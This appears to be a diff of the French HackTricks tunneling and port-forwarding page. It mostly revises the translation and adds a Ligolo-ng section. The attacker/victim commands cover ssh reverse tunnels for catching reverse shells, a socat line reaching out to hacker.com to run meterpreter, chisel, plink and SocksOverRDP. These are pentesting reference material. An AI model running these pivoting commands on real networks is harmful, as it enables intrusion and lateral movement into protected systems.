@@ -9,7 +9,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 <summary>Soutenir HackTricks</summary>
 
 * Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
@@ -23,7 +23,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 
 ## **Bash**
 
-**Hôte -> Jump -> InternalA -> InternalB**
+**Hôte -> Jump -> InterneA -> InterneB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -74,7 +74,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 Ceci est utile pour obtenir des shells inversés à partir d'hôtes internes à travers une DMZ vers votre hôte :
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
-# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
+# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
 # Note that port 443 must be open
 # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
@@ -131,7 +131,7 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-Une autre façon :
+Une autre méthode :
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -207,6 +207,42 @@ Vous devez utiliser la **même version pour le client et le serveur**
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
 ```
+## Ligolo-ng
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**Utilisez la même version pour l'agent et le proxy**
+
+### Tunneling
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+### Liaison et Écoute de l'Agent
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
+```
 ## Rpivot
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
@@ -260,7 +296,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne à la place de la dernière dans la console de la victime :
+Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne au lieu de la dernière dans la console de la victime :
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -296,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 C'est comme une version console de PuTTY (les options sont très similaires à celles d'un client ssh).
 
-Comme ce binaire sera exécuté sur la victime et qu'il s'agit d'un client ssh, nous devons ouvrir notre service ssh et notre port afin de pouvoir établir une connexion inversée. Ensuite, pour rediriger uniquement un port accessible localement vers un port de notre machine :
+Comme ce binaire sera exécuté sur la victime et qu'il s'agit d'un client ssh, nous devons ouvrir notre service ssh et notre port afin d'avoir une connexion inversée. Ensuite, pour rediriger uniquement un port accessible localement vers un port de notre machine :
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -328,7 +364,7 @@ Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Maintenant, nous pouvons **connecter** au **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** disant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
+Maintenant, nous pouvons **connecter** au **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **prompt** disant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
 
 **Connectez-vous** via **RDP** et téléchargez & exécutez sur la machine victime le binaire `SocksOverRDP-Server.exe` :
 ```
@@ -416,7 +452,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Changer le DNS de proxychains
 
-Proxychains intercepte l'appel `gethostbyname` de la libc et tunnelise la requête DNS tcp à travers le proxy socks. Par **défaut**, le serveur **DNS** que proxychains utilise est **4.2.2.2** (codé en dur). Pour le changer, éditez le fichier : _/usr/lib/proxychains3/proxyresolv_ et changez l'IP. Si vous êtes dans un **environnement Windows**, vous pouvez définir l'IP du **contrôleur de domaine**.
+Proxychains intercepte l'appel `gethostbyname` de libc et tunnelise la requête DNS tcp à travers le proxy socks. Par **défaut**, le serveur **DNS** que proxychains utilise est **4.2.2.2** (codé en dur). Pour le changer, éditez le fichier : _/usr/lib/proxychains3/proxyresolv_ et changez l'IP. Si vous êtes dans un **environnement Windows**, vous pouvez définir l'IP du **contrôleur de domaine**.
 
 ## Tunnels en Go
 
@@ -485,12 +521,12 @@ chmod a+x ./ngrok
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Sniffing des appels HTTP
+#### Sniffing HTTP calls
 
 *Utile pour XSS, SSRF, SSTI ...*
 Directement depuis stdout ou dans l'interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Tunneling du service HTTP interne
+#### Tunneling internal HTTP service
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -528,7 +564,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 <summary>Soutenir HackTricks</summary>
 
 * Vérifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
